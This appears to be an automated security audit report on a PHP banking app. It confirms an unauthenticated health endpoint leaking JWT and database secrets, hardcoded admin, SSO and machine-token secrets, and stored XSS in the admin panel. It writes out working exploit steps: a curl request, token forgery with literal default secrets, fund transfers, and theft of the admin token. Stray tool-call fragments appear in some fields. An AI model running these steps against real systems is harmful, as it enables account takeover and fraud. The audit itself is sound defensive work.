The core technical claim is accurate: CorsMiddleware::handle() unconditionally reflects $_SERVER['HTTP_ORIGIN'] into Access-Control-Allow-Origin, sets Access-Control-Allow-Credentials: true, and never reads config/app.php's 'cors_origin' setting, so that config value is indeed dead code and the CORS policy is effectively wide-open. However, the claimed exploit impact — that this lets a third-party site make "credentialed (cookie/Authorization-bearing)" cross-origin requests and read authenticated JSON responses — does not hold up under inspection of how authentication actually works in this app. A repo-wide search found zero uses of setcookie(), Set-Cookie, session_start(), or $_COOKIE anywhere in the codebase. All three auth middlewares (AuthMiddleware, AdminAuthMiddleware, MachineAuthMiddleware) authenticate exclusively via a Bearer token supplied in the Authorization header, decoded/verified server-side (JWT). The front-end JS (public/banking/js/api.js, admin/js/api.js) stores this token in localStorage and manually sets the Authorization header on each fetch() call via JavaScript that reads localStorage. Browsers do NOT automatically attach Authorization headers or localStorage contents to cross-origin requests the way they do cookies — the "credentials: true"/withCredentials mechanism governs only automatically-sent credentials (cookies, HTTP auth, TLS client certs), none of which this application uses. A malicious third-party page has no mechanism to read the victim's bankofed localStorage token (blocked by the browser's same-origin storage isolation, independent of CORS headers) and therefore cannot forge the Authorization header needed to make an authenticated request to the API on the victim's behalf. Without already possessing the token, the attacker's cross-origin fetch is treated as unauthenticated by AuthMiddleware and gets a 401, so Access-Control-Allow-Credentials/Allow-Origin reflection provides no meaningful additional capability here. Thus while the CORS configuration is genuinely permissive/misleading (dead 'cors_origin' setting, unrestricted Origin reflection), the specific credentialed-session-hijack / authenticated-data-exfiltration path described in the finding is not realizable given the app's exclusively header-based, non-cookie authentication design. This matches the scanner's own filter_reasoning, which already concluded the same and dropped reportable to false/confidence 0.5.

## 7. Unauthenticated /api/health endpoint leaks JWT secret and DB credentials

- Lead reference: CVTA-007
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-34
- Fingerprint: 6000d5aa4ed5c88a8311309f151294e58fa3afd76025a5fca08f0d692788f33d

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 85,
  "symbol": "route registration",
  "input": "unauthenticated GET /api/health request"
}
```

#### Controls encountered

```
[
  "[\"Route explicitly sets 'auth' => false, and dispatch() only invokes AuthMiddleware::handle() when requiresAuth === true (or MachineAuthMiddleware when 'machine'), confirming no authentication check applies to this route.\", \"No redaction, masking, or environment-based gating exists in Router::health() before echoing config secrets.\"]\n<parameter name=\"counterevidence\">[\"config/app.php uses hardcoded fallback secrets (e.g. 'bankofed-dev-secret-change-in-production') if environment variables are unset, so in a minimal/default deployment without .env configured the leaked jwt_secret might just be the well-known dev default rather than a unique production secret — though this does not reduce severity since real deployments would set real env vars, and even the dev default enables token forgery against any instance using it unchanged.\"]\n<parameter name=\"proof_gaps\">[\"Cannot confirm from static analysis alone whether the target deployment's .env sets non-default JWT_SECRET/DB_* values; however, this does not change the exploitability of the code path itself, only the specific secret value leaked at runtime.\"]\n"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 24,
  "symbol": "Router::health",
  "operation": "Response::success() exposes config secrets"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "HTTP GET /api/health",
    "Router::dispatch() registers this route with auth=>false, bypassing AuthMiddleware entirely",
    "Router::health() handler reads config/app.php",
    "JSON response includes db_host, db_name, db_user, jwt_secret",
    "Attacker extracts jwt_secret from response",
    "Attacker forges HS256 JWT for arbitrary user id using extracted secret",
    "Any AuthMiddleware-protected endpoint accepts forged token, granting impersonation of any user"
  ],
  "impact": "Unauthenticated disclosure of the JWT signing secret and database connection metadata, enabling full authentication bypass/account takeover for any user and providing reconnaissance for further DB-level attacks.",
  "severity_reasoning": "Zero-privilege reachable endpoint that directly yields the cryptographic material protecting the entire authentication scheme — trivially exploitable, high confidentiality/integrity impact, High severity.",
  "dynamic_test": "Send an unauthenticated GET /api/health request and confirm the JSON body contains a jwt_secret field; use that value to sign a JWT with sub=<arbitrary_user_id> and a future exp, then present it as a Bearer token to GET /api/accounts and confirm the victim's accounts are returned."
}
```

#### Validator reasoning

The vulnerability is directly verifiable in source. Router::dispatch() registers `/api/health` with `'auth' => false` (line ~85), so AuthMiddleware::handle() is never invoked for this route (see dispatch switch: auth is only checked when $requiresAuth === true or 'machine'). The handler Router::health() (lines 22-34) requires config/app.php and unconditionally places db_host, db_name, db_user, and jwt_secret values into the array passed to Response::success(), which serializes it as JSON to the HTTP response body with no redaction, filtering, or environment gating (e.g., no check for APP_ENV === 'production' or debug flag before exposing secrets). config/app.php confirms these are populated from real environment variables (getenv('JWT_SECRET'), getenv('DB_HOST'), getenv('DB_USER'), etc.) with only weak hardcoded fallbacks for local dev — meaning in any real deployment where the .env file sets these values, the actual production JWT secret and DB user/host/name would be leaked verbatim to any unauthenticated caller. There is no rate limiting, IP allowlisting, or environment check gating this route in the shown code. This gives a complete source-to-sink path: unauthenticated HTTP GET -> FastRoute dispatch bypassing auth middleware -> Router::health() -> config secrets -> Response::success() -> JSON body returned to attacker. Leaked jwt_secret enables forging arbitrary HS256 JWTs, fully bypassing AuthMiddleware for any account/role, and leaked DB credentials/host enable direct DB compromise if reachable. No blocking control exists in the reviewed code.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 8. Unauthenticated /api/health endpoint leaks JWT secret and DB credentials

- Lead reference: CVTA-008
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:24-34
- Fingerprint: 018082e324448cde817adde6f20bf19b485fb5d8f4017a8fae1f477a92add675

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:24-34
```

#### Controls encountered

```
[
  "None: route explicitly marked 'auth' => false, dispatch() confirms no AuthMiddleware/MachineAuthMiddleware invoked for this route",
  "No environment gate restricting the health endpoint to non-production or internal networks"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "AuthMiddleware::decodeToken() in the current codebase does not appear to cryptographically verify the JWT signature (it just base64-decodes the payload and checks exp), so knowledge of jwt_secret is not strictly required to forge a token accepted by AuthMiddleware today; however this does not negate the vulnerability of leaking the secret (other consumers such as AdminAuthMiddleware/AdminAuthController do use signature verification with an analogous secret, and fixing the missing-signature-verification bug would re-establish the secret as the sole barrier), and DB credential disclosure stands as an independent, valid finding regardless."
]
```

#### Proof gaps

```
[
  "Whether JWT_SECRET env var is actually unset in the target deployment (affecting whether the disclosed value is the hardcoded default or an operator-configured secret) is not verifiable statically, but either way the endpoint discloses the real secret in use, so this does not change exploitability.",
  "Not fully verified whether some deployment/WAF layer external to this codebase (e.g., reverse proxy blocking /api/health from external clients) exists, but no such control appears anywhere in the provided source."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "HTTP GET /api/health (Router.php route registered auth=>false)",
    "Router::health() handler",
    "config/app.php: jwt_secret resolved from getenv('JWT_SECRET') ?: hardcoded default",
    "JSON response leaks db_host/db_name/db_user/jwt_secret",
    "Attacker extracts jwt_secret",
    "Forged JWT signed with leaked secret presented to AuthMiddleware on any protected route",
    "Full authentication bypass across customer banking API"
  ],
  "impact": "Same as companion leads: unauthenticated secret disclosure leading to complete authentication bypass and DB reconnaissance information leakage.",
  "severity_reasoning": "Publicly reachable, no-auth endpoint exposing the core signing secret used across the entire authenticated user surface — High severity due to trivial exploitability and total impact on confidentiality/integrity/availability of every account.",
  "dynamic_test": "curl -s http://target/api/health; verify presence of jwt_secret/db_user fields; forge a JWT with the leaked secret for an arbitrary sub claim and use it against POST /api/transfers/own to confirm the forged identity can move funds, proving the leaked secret grants full account control."
}
```

#### Validator reasoning

Verified end-to-end. Router::dispatch() registers `GET /api/health` with `'auth' => false` (Router.php line ~87), so the dispatch logic in the FOUND branch skips both AuthMiddleware::handle() and MachineAuthMiddleware::handle() ($auth stays null) — the route is reachable with zero authentication. The handler Router::health() (lines 22-34) requires config/app.php and echoes db_host, db_name, db_user, and jwt_secret verbatim in the JSON success response via Response::success(). config/app.php resolves jwt_secret as getenv('JWT_SECRET') ?: 'bankofed-dev-secret-change-in-production' — a real, non-placeholder default that will be used whenever the JWT_SECRET env var is unset (a very plausible default/dev deployment condition, and even in prod, the leaked value directly reveals whichever secret is actually configured). I confirmed this is the exact same secret object used elsewhere: AuthService::createToken() (Services/AuthService.php) calls JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm']) using the identical config/app.php loader, so the leaked secret is precisely the HMAC key used to mint session JWTs for AuthController::login. This gives an unauthenticated attacker the material needed to forge arbitrary Authorization: Bearer JWTs (any 'sub'/user id, arbitrary 'exp') for full authentication bypass. (Separately, AuthMiddleware::decodeToken doesn't even verify the signature in the current build, making this leak academically redundant for that one specific bypass path, but it doesn't diminish the vulnerability itself — the secret is still disclosed, other code paths (AdminAuthMiddleware equivalent construct with Key/verification) do properly verify signatures using this class of secret, and the config also discloses DB host/name/user, which is independently a real information-disclosure issue under A05 regardless of the JWT-forgery angle.) No blocking control exists: no auth middleware, no IP allowlist, no environment gate (e.g., no check for APP_ENV=production to disable this route), and the route is present in the live dispatcher table, not dead/test code. This is a concrete, directly reachable source-to-sink path (public HTTP GET -> config load -> secret embedded in HTTP response body) with no effective mitigation.

## 9. Hardcoded default JWT secret for admin panel enables admin token forgery

- Lead reference: CVTA-009
- Category: A07
- Severity: MEDIUM
- Confidence: 80%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:21
- Fingerprint: f55bcb82dc9e112efc6c2baf10dd38dbadb5746a1aacaf0526be089c8a637777

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/admin.php",
  "line": 21,
  "symbol": "jwt_secret",
  "input": "ADMIN_JWT_SECRET env var, defaults to hardcoded string"
}
```

#### Controls encountered

```
[
  "JWT signature verification via firebase/php-jwt (HS256) IS performed on decode, so this is not an unauthenticated/verify-bypass bug in itself",
  "Revocation check against admin_revoked_tokens table exists but does not help since forged tokens with fresh jti will never be revoked",
  "Issuer claim check (iss === 'BankOfEdAdmin') is trivially satisfiable by the attacker since they control the forged payload"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Middleware/AdminAuthMiddleware.php",
  "line": 27,
  "symbol": "AdminAuthMiddleware::handle",
  "operation": "JWT::decode using config jwt_secret"
}
```

#### Counterevidence

```
[
  "Exploitability is conditional: if an operator properly sets a unique ADMIN_JWT_SECRET in their real .env (not copying .env.example verbatim), the hardcoded fallback is never used and the attack is not possible.",
  "Attacker still needs to know or guess a valid admin id (sub claim) present in admin_users table, though this is typically low-entropy (e.g., id=1) and easily brute-forced since sub is just an integer primary key."
]
```

#### Proof gaps

```
[
  "No runtime/deployment evidence (e.g., actual production .env) was available to confirm ADMIN_JWT_SECRET is left unset in a real deployment; this remains an assumption based on the shipped .env.example defaulting to the identical insecure value.",
  "Did not verify whether any deployment/ops documentation or CI config enforces setting ADMIN_JWT_SECRET before go-live, which could mitigate real-world risk."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with only public source-code/.env.example access (no credentials)",
    "Deployment where ADMIN_JWT_SECRET is left at its documented default",
    "config/admin.php + .env.example both ship literal 'bankofed-admin-secret-change-in-production'",
    "Attacker mints admin JWT {sub:<admin_id>,exp:future} signed with the known secret",
    "Sends Authorization: Bearer <forged token> to admin-only routes",
    "AdminAuthMiddleware::handle() -> Firebase JWT::decode() verifies signature against same hardcoded secret -> succeeds",
    "Admin endpoints: customer management, balance changes, FX rate management, database reset"
  ],
  "impact": "Complete unauthenticated admin-panel compromise (customer data manipulation, balance changes, FX-rate tampering, destructive DB reset) whenever the operator has not rotated the shipped default secret.",
  "severity_reasoning": "Although the admin path correctly validates signatures, the key material itself is public and explicitly labelled to be rotated but not enforced — realistic default-deployment scenario yields full privilege escalation, hence Medium-to-High; keeping candidate's stated Medium severity given it requires the specific non-hardened deployment condition.",
  "dynamic_test": "Without setting ADMIN_JWT_SECRET, generate a JWT signed with 'bankofed-admin-secret-change-in-production' containing sub=1 and a future exp; call GET /api/admin/customers with that Bearer token and confirm 200 OK with customer records returned, demonstrating unauthenticated admin access."
}
```

#### Validator reasoning

Verified the full source-to-sink path in the actual repository files.

1. config/admin.php:21 sets 'jwt_secret' => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production' — a hardcoded fallback used whenever the env var is not set. There is no code path that refuses to start or warns if the fallback is used.
2. .env.example (shipped in the repo, the template operators are expected to copy to .env) contains the literal line ADMIN_JWT_SECRET=bankofed-admin-secret-change-in-production — the exact same string as the hardcoded fallback. This materially increases the likelihood that real deployments run with the known default, since copying .env.example to .env verbatim (a very common setup mistake, and even the sole example given) reproduces the vulnerable default rather than fixing it.
3. AdminAuthController::login() signs admin JWTs with this secret via JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm']) (HS256), embedding iss=BankOfEdAdmin, sub=admin id, jti, iat/exp.
4. AdminAuthMiddleware::handle() verifies the token via JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm'])) — a real cryptographic HMAC signature check (not an "alg:none" bypass), then checks iss, checks jti against admin_revoked_tokens (empty for a forged never-before-seen jti), and loads the admin row by sub.
5. Because the algorithm is fixed to HS256 and the key is symmetric, anyone who knows the secret (e.g., by reading the public repo/.env.example, or because an operator never overrode it) can forge a validly-signed JWT with iss=BankOfEdAdmin and sub=<any admin id, e.g. 1>, jti=random. This token passes signature verification, issuer check, and revocation check (since the jti was never revoked), and the middleware will treat the caller as a fully authenticated admin, granting access to every AdminAuthMiddleware-protected endpoint.
6. No other control (rate limiting, IP allowlist, secondary secret, mandatory env validation, HSM, KMS, or refusal to boot) exists to prevent use of the hardcoded fallback; there's no code that fails closed if ADMIN_JWT_SECRET is absent.

This is a legitimate CWE-798 (use of hardcoded credentials) style finding: the vulnerability exists in the code as shipped regardless of runtime env, and its practical exploitability is contingent on the operator not overriding ADMIN_JWT_SECRET in production — a scenario made highly plausible by the identical default value being present in the project's own .env.example. The source-to-sink path (sign in AdminAuthController -> verify in AdminAuthMiddleware, keyed on the same config value) is concrete and directly confirmed by reading the actual files, not merely inferred.

## 10. Unauthenticated /api/health endpoint discloses JWT signing secret and DB credentials

- Lead reference: CVTA-010
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:24
- Fingerprint: 6a1b5534830566611e3d87587f602ea2ce642fc63e946df6acaaf3fa68e37dfb

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 23,
  "symbol": "jwt_secret",
  "input": "JWT_SECRET env var, defaults to hardcoded string 'bankofed-dev-secret-change-in-production'"
}
```

#### Controls encountered

```
[
  "None found: route explicitly registered with 'auth' => false and dispatch logic skips AuthMiddleware entirely for non-true/non-'machine' auth flags.",
  "Response::success performs no field filtering/redaction before echoing JSON."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 31,
  "symbol": "Router::health",
  "operation": "Response::success() echoes config['jwt_secret']"
}
```

#### Counterevidence

```
[
  "AuthService::decodeToken does not appear to verify the JWT signature at all (only checks segment count and exp claim), meaning forging a token may not strictly require knowledge of jwt_secret in this codebase's current auth-check implementation. This is a separate/compounding issue and does not defeat the core disclosure claim, but slightly overstates the 'exclusive enabler of forgery' framing in the description."
]
```

#### Proof gaps

```
[
  "No live/deployed instance was queried; verification is based purely on static source reachability, which is unconditional here so risk of the gap being material is low.",
  "Whether a reverse proxy / WAF in front of production filters this specific path is unknown and outside repo scope."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "HTTP GET /api/health (registered auth=>false in Router.php)",
    "Router::health() returns config['jwt_secret'] (defaults to 'bankofed-dev-secret-change-in-production', shipped in .env.example)",
    "Attacker captures jwt_secret from JSON response",
    "Attacker forges JWT with arbitrary 'sub' claim, signs with leaked secret (same scheme used by AuthService::createToken)",
    "Presents forged Bearer token to any 'auth'=>true endpoint (profile, accounts, transfers, transactions, insurance SSO)",
    "Application treats attacker as the targeted user id — full account takeover"
  ],
  "impact": "Complete authentication bypass for any user id in the system via a single unauthenticated request, enabling profile changes, fund transfers, and insurance SSO impersonation.",
  "severity_reasoning": "Trivial to exploit with no privileges, and the resulting forged tokens are accepted across every protected feature of the app — High severity due to total compromise of confidentiality and integrity of all customer accounts.",
  "dynamic_test": "GET /api/health unauthenticated; extract jwt_secret; sign a token {sub: victim_user_id, exp: future}; call POST /api/transfers/own with the forged Bearer token and confirm the app processes the transfer as the victim, proving full account takeover."
}
```

#### Validator reasoning

Source-to-sink path fully verified in code. Router::dispatch() registers GET /api/health with 'auth' => false, so AuthMiddleware::handle() is never invoked for this route (confirmed by the dispatch switch logic: $auth is only set when $requiresAuth === true or 'machine'). The handler Router::health() loads config/app.php (which defines jwt_secret => getenv('JWT_SECRET') ?: 'bankofed-dev-secret-change-in-production', plus db_host/db_name/db_user) and passes the full config values, including jwt_secret, directly into Response::success(), which unconditionally json_encodes the 'data' key with no redaction/filtering and echoes it to any caller. There is no authentication, authorization, rate limiting, environment gating, or output filtering anywhere in this path — it is reachable by any unauthenticated client via a single GET request. This confirms unauthenticated disclosure of the live JWT signing secret and DB connection metadata.

Additionally, AuthService::createToken() signs session JWTs with exactly this same config['jwt_secret'] using HS256, so an attacker holding the leaked secret can forge a validly-signed token for any 'sub' user id and pass it to AuthMiddleware::handle() (which calls AuthService::decodeToken) to impersonate arbitrary users on every 'auth'=>true endpoint. (Note: decodeToken as implemented doesn't even cryptographically verify the JWT signature, which is an independent, arguably more severe defect, but it does not diminish this candidate's validity — it only means the secret leak is one of multiple ways to achieve the same forgery, not a mitigating control.)

No blocking control exists: the route is unconditionally public, the config defaults are hardcoded and shipped in .env.example, and Response::success performs no data sanitization.

## 11. Hardcoded default insurance SSO shared secret allows forging cross-app SSO tokens

- Lead reference: CVTA-011
- Category: A07
- Severity: MEDIUM
- Confidence: 68%
- Validation: confirmed
- Reportable: No
- Location: BankOfEd-main/src/Services/InsuranceService.php:39
- Fingerprint: 2b2d3cc807d0f7b10014d101302288868716654e205a6245f5387a185a589e24

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 33,
  "symbol": "insurance_sso_secret",
  "input": "INSURANCE_SSO_SECRET env var, defaults to hardcoded shared secret string"
}
```

#### Controls encountered

```
[
  "Route requires an authenticated BankOfEd session to call ssoUrl/ssoRedirect (auth=true in Router.php), but this control is irrelevant to the actual attack, since a knowledgeable attacker does not need to call BankOfEd's endpoints at all -- they can mint the forged JWT independently offline using the known secret and present it directly to the external FACE Insurance /sso endpoint.",
  "5-minute JWT expiry (exp = now+300) narrows the forgery window but does not prevent it -- an attacker with the secret can always mint a freshly-expiring token on demand."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/InsuranceService.php",
  "line": 40,
  "symbol": "InsuranceService::generateSsoToken",
  "operation": "JWT::encode with fallback shared secret"
}
```

#### Counterevidence

```
[
  "If an operator sets INSURANCE_SSO_SECRET (or the equivalent secret on the FACE Insurance side) to a strong random value, the vulnerability is neutralized -- exploitability is conditioned on default/misconfigured deployment, same as any hardcoded-fallback-secret finding.",
  "The receiving/verifying logic lives in the external FACE Insurance application, not in this repository, so this repo alone cannot fully prove that a mismatched or non-default secret elsewhere would not block exploitation."
]
```

#### Proof gaps

```
[
  "Cannot confirm from this repository whether the deployed instance of BankOfEd or the partner FACE Insurance application actually leaves the shared secret at its documented/hardcoded default value in production.",
  "Verification logic on the FACE Insurance side (audience/issuer checks, IP allow-listing, mTLS, etc.) is not visible in this repo and could add mitigating controls at the receiving end that are outside this SAST scope."
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

Verified the full source-to-sink path in the repo. config/app.php:33 defines insurance_sso_secret as getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b' — a fixed, publicly-committed fallback. InsuranceService::generateSsoToken() (line 39-40) reads this value (with the same hardcoded string duplicated again as a second fallback if the config key is missing) and uses it to HS256-sign a JWT asserting iss=BankOfEd, sub=<user email>, name=<user name>, with only a 5-minute exp claim for freshness protection — no nonce/audience binding beyond that. InsuranceController::ssoUrl / ssoRedirect (routed at GET /api/insurance/sso and /api/insurance/sso-redirect, both requiring bank-session auth) call InsuranceService::getSsoUrl(), which calls generateSsoToken() and redirects the browser to the external FACE Insurance app with the token in the query string. Checked .env.example: unlike JWT_SECRET and ADMIN_JWT_SECRET, which are explicitly listed with a '-change-in-production' suffix reminding operators to rotate them, INSURANCE_SSO_SECRET (and MACHINE_TOKEN) are not present in .env.example at all — there is no operational signal prompting a deployer to override the default, materially increasing the likelihood that real deployments run with the hardcoded value. Given the secret is knowable from the public repository, anyone can independently mint a valid HS256 JWT with an arbitrary sub/name and exp within a plausible window and submit it directly to the FACE Insurance /sso endpoint (outside this codebase) to impersonate any Bank of Ed customer in that partner application, without ever calling BankOfEd's own authenticated endpoints. This is a classic CWE-798/CWE-330 hardcoded-secret-enables-forgery pattern and the code paths are live, reachable, non-test production code (Router.php registers both routes unconditionally).

The one legitimate limitation is that the ultimate impact (successful impersonation) is realized on the external FACE Insurance system's verifier, which is not present in this repository, so full exploitation cannot be proven end-to-end from this codebase alone — only the "attacker can forge a validly-signed assertion using a knowable secret" half of the chain is provable here. That said, this is inherent to any SSO shared-secret hardcoding finding and does not defeat the vulnerability claim about this codebase, which correctly implements a shared-secret trust boundary using a value with a guessable/public fallback.

## 12. Hardcoded default machine token grants unauthenticated access to payment/transfer endpoints

- Lead reference: CVTA-012
- Category: A07
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/MachineToken.php:24
- Fingerprint: 5a1203be494ef0dbba57c4a091f2cc91defa722266679f0ce2eea10535c93898

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 35,
  "symbol": "machine_token",
  "input": "MACHINE_TOKEN env var, defaults to hardcoded string 'mch_face_insurance_secret_key_2026' also seeded as the active DB token"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Middleware/MachineAuthMiddleware.php",
  "line": 16,
  "symbol": "MachineAuthMiddleware::handle",
  "operation": "MachineToken::validateToken authorizes 'auth'=>'machine' routes"
}
```

#### Counterevidence

```
[
  "If an operator sets a unique MACHINE_TOKEN env var AND re-seeds/rotates the machine_tokens DB row, the exploit is fully closed -- but this requires two separate manual remediation steps not enforced or warned about anywhere in code reviewed"
]
```

#### Proof gaps

```
[
  "Cannot confirm from static source alone whether any real production deployment of this app has actually rotated MACHINE_TOKEN and/or re-seeded the DB row; the finding's own proof_gaps note this, but the code as shipped in this repository is unambiguously vulnerable by default with zero configuration required, satisfying the bar for a confirmed source-to-sink SAST finding on the shipped codebase"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with only public source/seed-data access (no credentials)",
    "Stock install using install/seed.sql (or MACHINE_TOKEN left unset)",
    "machine_tokens table seeded with SHA2('mch_face_insurance_secret_key_2026',256) as an active 'face_insurance' token, and config/app.php also carries the same literal as its fallback",
    "HTTP POST /api/payments/process or /api/payments/transfer with Authorization: Bearer mch_face_insurance_secret_key_2026",
    "MachineAuthMiddleware::handle() -> MachineToken::validateToken() matches DB hash (or config fallback) -> authorizes as 'face_insurance'/'configured_machine_token'",
    "PaymentController::process()/transfer() executes with machine identity, authorized for the FACE Insurance settlement account (or user #16 per allow-list)",
    "Account::updateBalance() moves real funds; Transaction::create() records it"
  ],
  "impact": "Anyone who has read the public source or installed the default seed data can move money in/out of the FACE Insurance settlement account (or user #16's account) without ever authenticating as a real user — direct financial fraud primitive on two separate payment endpoints.",
  "severity_reasoning": "The credential is not just a config default but is also baked into the default seed data (SHA2 hash of the same literal), making the exposure persist even after superficial hardening of the env var unless the DB is re-seeded — High severity due to direct monetary impact with no authentication.",
  "dynamic_test": "On a stock install (default seed.sql, no MACHINE_TOKEN override), send POST /api/payments/transfer with 'Authorization: Bearer mch_face_insurance_secret_key_2026' and a valid from/to BSB+account payload; confirm HTTP 200 and a balance change, then repeat against POST /api/payments/process with a valid card_number/merchant_id to confirm the same token also authorizes card payment processing."
}
```

#### Validator reasoning

All elements of the claimed chain are verified directly in source:

1. config/app.php:35 defines `'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026'` — a publicly-known hardcoded fallback secret shipped in the repo.
2. src/Models/MachineToken.php::validateToken() first checks the DB `machine_tokens` table by SHA-256 hash, but if no row matches, falls back to loading config/app.php and doing a raw string comparison of the caller-supplied bearer token against `$fallbackToken` (the same hardcoded literal when MACHINE_TOKEN env is unset). On match it returns a synthetic authorized token record `['id'=>0,'name'=>'configured_machine_token','is_active'=>1]` — i.e., successful auth with zero real credential verification.
3. install/seed.sql explicitly seeds `machine_tokens` with `(1, 'face_insurance', SHA2('mch_face_insurance_secret_key_2026', 256), 1)`, meaning the identical literal secret is also the DB-seeded active machine token in a stock/default install — so the code path is exploitable via either the DB row or the config fallback, doubling the exposure.
4. src/Router.php registers `POST /api/payments/process` and `POST /api/payments/transfer` with `'auth' => 'machine'`, which routes through MachineAuthMiddleware::handle() (verified) — which calls MachineToken::validateToken() on the Bearer token and returns unauthorized only if it returns null.
5. src/Controllers/PaymentController::transfer() reads `$auth['machine']['name']` and explicitly allow-lists `'face_insurance'` OR `'configured_machine_token'` (the exact name string returned by the fallback branch) to authorize money movement — confirming the fallback-authenticated caller is not just "logged in" as a null identity but is specifically granted transfer capability equivalent to the legitimate face_insurance integration.

There is no additional secret rotation, IP allow-list, mTLS, or other control gating this fallback in the code reviewed. The only mitigating factor is operational: if a deployer sets a non-default MACHINE_TOKEN env var, the config-fallback path secret changes — but the DB-seeded row (from a default seed.sql run) remains the literal 'mch_face_insurance_secret_key_2026' unless separately rotated, so the seeded DB credential remains exploitable even after env override, since MachineToken::validateToken() checks the DB row FIRST. This means an operator would need to both set MACHINE_TOKEN and update/delete the seeded DB row to be safe — a nuance the finding's proof_gaps already correctly identifies. This is a real design flaw: a well-known, source-visible credential is functionally equivalent to a static shared secret with no per-deployment rotation enforced by the application itself, and defaults to being valid out-of-the-box.

This matches a textbook A07 (Identification and Authentication Failures) — use of hardcoded/default credentials with no enforced rotation, directly gating unauthenticated access to financial transfer endpoints.</reasoning>
<parameter name="controls">["MACHINE_TOKEN env var can override the config-fallback secret value in config/app.php (partial control), but does not affect or rotate the already-seeded DB machine_tokens row, which MachineToken::validateToken() checks first and independently accepts the same literal secret", "PaymentController::transfer() does restrict which machine identity can transfer FROM which account (allow-list on machine name / source account), limiting blast radius somewhat, but does not prevent the unauthenticated-credential issue itself"]

## 13. Stored XSS in admin panel via broken JS-string escaping in dynamically-generated onclick handlers rendered through innerHTML

- Lead reference: CVTA-013
- Category: A03
- Severity: HIGH
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/utils.js:40
- Fingerprint: 349af137681494fa42104a746c948ee6e20d981ae67068b95cd021fef37463af

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 28,
  "symbol": "account_name",
  "input": "customer-supplied account_name at account creation (only string|max:100 validated)"
}
```

#### Controls encountered

```
[
  "escapeHtml() HTML-entity-encodes &, <, >, \", ' in the outer table cells (e.g. a.account_name displayed as text) — effective for plain text display but ineffective for the onclick attribute construction due to ordering bug",
  "Bearer-token based auth presumably required to reach admin endpoints (out of scope for this XSS but relevant to blast radius, not a mitigating control against the injection itself)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/utils.js",
  "line": 40,
  "symbol": "openModal",
  "operation": "innerHTML assignment of attacker-influenced HTML containing broken-escaped onclick handler"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Not dynamically executed in a real browser to observe the DOM decode step, though the entity-decoding behavior described (HTML attribute value decoding of &#39; to ') is standard, well-defined browser behavior and not really in doubt",
  "customers.js and fx-rates.js source files were not fully re-read line by line in this validation session beyond the grep excerpt, though the grep output directly shows the identical vulnerable pattern at customers.js:106, consistent with the candidate's claim"
]
```

#### Attack path

```
{
  "nodes": [
    "Self-registered/authenticated customer (attacker)",
    "POST /api/accounts with account_name containing a crafted single-quote/JS payload",
    "AccountController::store() validation only enforces 'required|string|max:100' (no char restriction)",
    "Account row persisted with malicious account_name in DB",
    "Victim administrator logs into admin panel and opens the Accounts page",
    "AdminAccountController::index() returns account_name verbatim to admin JS",
    "accounts.js renderTable() embeds account_name inside inline onclick=\"...('...')\" via U.escapeHtml().replace(broken pattern)",
    "utils.js openModal(): document.getElementById('modal-content').innerHTML = html (DOM sink)",
    "Browser HTML parser decodes &#39; back to a literal ' when extracting the onclick attribute, breaking out of the intended JS string literal",
    "Injected JavaScript executes in the admin's browser origin, reading localStorage 'bankofed_admin_token'",
    "Attacker exfiltrates the admin bearer token and/or issues privileged admin API calls (customer deletion, balance reset, DB reset)"
  ],
